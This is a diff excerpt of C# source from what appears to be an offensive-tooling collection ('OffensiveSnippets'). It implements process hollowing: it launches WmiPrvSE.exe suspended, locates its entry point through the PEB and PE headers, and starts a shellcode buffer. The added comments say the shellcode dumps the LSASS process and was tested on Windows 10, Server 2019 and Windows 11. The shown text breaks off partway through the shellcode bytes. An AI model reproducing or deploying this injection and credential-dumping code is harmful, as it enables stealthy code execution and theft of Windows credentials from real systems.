@@ -82,23 +82,31 @@ namespace OffensiveSnippets {
         static void Main(string[] args) {
             STARTUPINFO si = new STARTUPINFO();
             PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
+            
             bool res = CreateProcess(null, "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe", IntPtr.Zero, IntPtr.Zero,
                 false, 0x4, IntPtr.Zero, null, ref si, out pi);
             PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
             uint tmp = 0;
             IntPtr hProcess = pi.hProcess;
             ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);
+            
             IntPtr ptrToImageBase = (IntPtr)((Int64) bi.PebBaseAddress + 0x10);
             byte[] addrBuf = new byte[IntPtr.Size];
             IntPtr nRead = IntPtr.Zero;
+            
             ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);
-            IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));
+            IntPtr WmiPrvSEBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));
             byte[] data = new byte[0x200];
-            ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);
+            ReadProcessMemory(hProcess, WmiPrvSEBase, data, data.Length, out nRead);
+            
             uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3c);
             uint opthdr = e_lfanew_offset + 0x28;
             uint entrypoint_rva = BitConverter.ToUInt32(data, (int) opthdr);
-            IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64) svchostBase);
+            IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64) WmiPrvSEBase);
+            
+            // https://osandamalith.com/2019/05/11/shellcode-to-dump-the-lsass-process/
+            // This shellcode is for Windows 10 and Server 2019 x86_64.
+            // Tested alos on Windows 11 x64.
             byte[] buf = new byte[822] {
             0xE9, 0x1B, 0x03, 0x00, 0x00, 0xCC, 0xCC, 0xCC, 0x48, 0x89, 0x5C, 0x24, 0x08, 0x48, 0x89, 0x74,
             0x24, 0x10, 0x57, 0x48, 0x83, 0xEC, 0x10, 0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00,
